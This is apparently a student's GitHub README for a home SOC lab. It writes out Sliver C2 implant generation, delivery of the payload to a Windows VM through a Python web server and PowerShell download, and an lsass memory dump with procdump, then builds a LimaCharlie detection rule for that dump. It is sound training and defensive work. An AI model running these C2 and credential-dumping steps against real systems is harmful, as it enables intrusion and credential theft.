# SOC-Lab
This is a SOC focused home lab that will use a variety of tools including Sliver to simulate an attack on a vulnerable machine. During this lab the vulberable machine is the Windows VM, attacking machine will be a Kali Linux, and the monitoring tool will be LimaCharlie. 

# As a disclaimer, the original idea for this lab comes from Eric Capuano. Setting up the lab environment has been purposefully left out and I highly suggest anyone interested in replicating this lab visit his Substack page(linked below)!

[Eric's Substack](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro)

# SOC-Lab

## Objective

The SOC Lab is designed to showcase my skills in a simulated real world environment with an attacker(Linux) and Defender(Windows). The SOC home lab is designed to simulate real-world cybersecurity environments, allowing me to practice identifying, investigating, and mitigating cyber threats in a controlled setting. Its primary objective is to provide hands-on experience with security tools, techniques, and processes, helping me to develop practical skills in network monitoring, threat detection, and response strategies. Additionally, it aims to foster a deeper understanding of the cybersecurity landscape, including the tactics, techniques, and procedures (TTPs) used by attackers. By recreating the challenges faced by professional SOCs, this home lab serves as a valuable educational platform for an aspiring cybersecurity professional, such as myself, enhancing my readiness for careers in the rapidly evolving field of information security.
### Skills Learned

- Learning to identify and analyze potential security threats in network traffic and logs, using tools like LimaCharlie.
- Developing the skills necessary to effectively respond to and manage security incidents, including containment strategies, eradication of threats, and recovery processes.
- Gaining experience in monitoring network traffic for suspicious activity and conducting forensic analysis to understand the nature and impact of security breaches.
- Learning about the development and implementation of security policies and best practices to protect organizational assets and data.
- Acquiring the ability to use threat intelligence feeds and sources to anticipate and defend against potential cyber attacks, understanding the tactics, techniques, and procedures used by cybercriminals

### Tools Used


- VMWare to host the Virtual Environments. 
- LimaCharlie for network monitoring and management. 
- Linux VM to serve as attacking machine.
- Windows VM to serve as Victim machine.
- Sliver, an open source red team tool, used to launch payloads and maintain persistence on victims machine.

  ### Steps: Part 1

  1. First, I drop into a root shell and change directory to our Sliver install
       - sudo su
       - cd /opt/sliver
  2. Next I launch sliver server
       - sliver-server

    ![4 Sliver](https://github.com/Lantern76/SOC-Lab/assets/119342094/6a6d3fb1-6f62-448a-97e2-3638c10332a8)

  3. Generate our first C2 session payload (within the Sliver shell) using the attacking machines IP address.
       - generate --http  --save /opt/sliver

![2 generate payload](https://github.com/Lantern76/SOC-Lab/assets/119342094/e864ec91-db64-4aa6-a74f-c910cf9d44e1)

  4. Confirm the new implant configuration
       - implants

  ![3](https://github.com/Lantern76/SOC-Lab/assets/119342094/b7064aaf-9dca-4a98-be00-011422b3f89e)

  5. Now I have a C2 payload I can drop onto my Windows VM. I’ll do that next. First, I will go ahead and exit Sliver 
       - exit
  6. To easily download the C2 payload from the Linux VM to the Windows VM, I will use a little python trick that spins up a temporary web server
       - cd /opt/sliver
       - python3 -m http.server 80
  7. Next is to switch to the Windows VM and launch an Administrative PowerShell console
  8. Now I run the following command to download my C2 payload from the Linux VM to the Windows VM, using my own Linux VM IP and the name of the payload I generated in Sliver, RAPID_PLENTY.exe, a few steps prior
       - IWR -Uri http://[Linux_VM_IP]/REGULAR_PLENTY.exe -Outfile C:\Users\User\Downloads\REGULAR_PLENTY.exe
  9. Now that the payload is on the Windows VM, I must switch back to the Linux VM SSH session and enable the Sliver HTTP server to catch the callback
       - First I need to terminate the python web server by pressing Ctrl + c
       - Next is to relaunch Sliver
           - sliver-server
        - Begin the Sliver HTTP listener
            -http
  10. Return to the Windows VM and launch a powershell session as an administrator. Afterwords launch the payload
        - C:\Users\User\Downloads\RAPID_PLENTY.exe
  11. Within a few moments, I should see my session check in on the Sliver server

  ![6 sliver sessions](https://github.com/Lantern76/SOC-Lab/assets/119342094/4383b004-3e19-43af-93b2-1d01dce94c0b)

  12. I then need to verify my session in Sliver, taking note of the Session ID
        - sessions

  ![5 sliver server](https://github.com/Lantern76/SOC-Lab/assets/119342094/0ae65380-7053-44f1-b4d8-c4bf2a50fd3a)

  13. To interact with my new C2 session, I type the following command into the Sliver shell, swapping [session_id] with one shown in image

  ![7 sliver sessions](https://github.com/Lantern76/SOC-Lab/assets/119342094/b0ef3872-d516-4add-833b-2be37bf1f975)

  14. I am now interacting directly with the C2 session on my Windows VM. Let’s run a few basic commands to get our bearing on the victim host
        - Get basic info about the session
            - info
        - Find out what user my implant is running as, and learn it’s privileges
            - whoami
            - getprivs
        - As a side note, since the implant was run with admin rights, you’ll notice we have a few privileges that make further attack activity much easier, such as “SeDebugPrivilege” 

![1](https://github.com/Lantern76/SOC-Lab/assets/119342094/8024c4fd-f411-4b01-9c68-112830e5e7d9)

  15. Identify our implant’s working directory
        - netstat
  16. Identify the running processes on the remote system
        - ps -T
        - Fun tip, Sliver will higlight its own processin green and any defensive tools in red
  17. Let’s hop into the LimaCharlie web UI and check out some basic features
        - Click “Sensors” on left menu
        - Click your active Windows sensor

![8 LimaCharlie sesnsors](https://github.com/Lantern76/SOC-Lab/assets/119342094/8b526208-145a-4e70-9ee4-05f4a84f73c7)

  18. On the new left-side menu for this sensor, click “Processes”

![9 LimaCharlie Processes](https://github.com/Lantern76/SOC-Lab/assets/119342094/15ca7ee1-39c1-42b1-94a3-ec9ef085f81c)

  19. Now I need to click the “Network” tab on the left-side menu

![10 LimaCharlie Network](https://github.com/Lantern76/SOC-Lab/assets/119342094/e193649e-3823-4b4e-8e02-4b8837e32539)

  20. Next I click on the “File System” tab on the left-side menu

![11 LimaCharlie file system](https://github.com/Lantern76/SOC-Lab/assets/119342094/4c04d6ad-1664-4c01-b43e-bdaff3fbcad1)

  21. Finally, I inspect the hash of the suspicious executable by scanning it with VirusTotal

![12 Virus total ](https://github.com/Lantern76/SOC-Lab/assets/119342094/afe0a49c-c917-4039-ad15-ecf695603985)


### Steps: Part 2

### Objective: Part 2 will foucs on creating a rule using LimaCharlie to detect and report suspicious activity focused around the lsass.exe service and an attacker attempting to remotely dump the victims credentials through procdump.

1. Countinuing on with Part 1 I will once again attempt to steal sensative data using the procdump function on the Linux machine
     - procdump -n lsass.exe -s lsass.dmp
     - This will "dump" the remote process memeory and save it locally to the Sliver C2 server

       ![memory dump](https://github.com/Lantern76/SOC-Lab/assets/119342094/6961b0b4-e5a9-4cbb-9c9b-84c76c0145bd)

2. Next is to switch over to LimaCharlie and look at the appropriate telemetry
     - Lsass.exe is already classified as a sensative process due to it being a common target for dumping tools
     - To view the lsass.exe memory dumpingn event I will need to move over to the Timeline section and filter for "SENSATIVE_PROCESS_ACCESS"

![sensative](https://github.com/Lantern76/SOC-Lab/assets/119342094/18b6efc2-4c8a-432c-9fb1-168967e74437)

3. Now that the credentail harvesting event has occured I am now able to craft the appropriate detection and response (D&R) rule that will send out an alert the next time this occurs

![DnR Rule](https://github.com/Lantern76/SOC-Lab/assets/119342094/8c7f711a-c588-4a14-b86e-704971da9edf)

4. In the "Detect" section of the new rule, I will need to remove all the content and replace it with a simpler and more effective version (Old rule will be shown on top of new rule below)

![old rule](https://github.com/Lantern76/SOC-Lab/assets/119342094/90705f36-c991-48a5-ac6c-245272dbb110)

![new rule](https://github.com/Lantern76/SOC-Lab/assets/119342094/b34dfd75-eb2f-40d6-831c-5e02a84535ed)

5. The in the "Respond" section of the new rule I will then outline the desired response for the new detection rule
     - For this instance the desired outcome is for LimaCharlie to send out an alert to the dashboard (New response shown in image above)
  
6. To test is the detection rule will work on future attacks the is a "test event" button located below which will test the new rule against the previous memory dump attempt
     - In this case the rule has worked and will now send out alerts for similar events in the future.
   
![Screenshot 2024-04-13 030654](https://github.com/Lantern76/SOC-Lab/assets/119342094/84dbc3f4-6054-4361-b424-39f66eadba57)

7. To activate and save the rule the "Save Rule" button will need to be pressed and the rule be given a name (also the slider must be set to enabled)

![Screenshot 2024-04-13 030833](https://github.com/Lantern76/SOC-Lab/assets/119342094/a2e701f1-09d6-4e47-a7f2-4c9703737867)

8. To test the new detection rule in real time I will repeat steps 1 - 2 of part two of the lab to once again attempt to steal data from the victims machine using the procdump tool

9. But now after switching back over to LimaCharlie and moving to the detection option we can now view the detected threat caught from the unique rule I created earlier 

![Detection](https://github.com/Lantern76/SOC-Lab/assets/119342094/eafab942-0586-46ae-931d-cba0c0e08c0f)

10. Lastly by expanding the detection event we are able to view the raw data of the event which can show important data such as the address and program which initiated the alert

    ![DnR Rule](https://github.com/Lantern76/SOC-Lab/assets/119342094/bcaa152c-769b-4f12-9452-e72308d0c63c)




















  
   
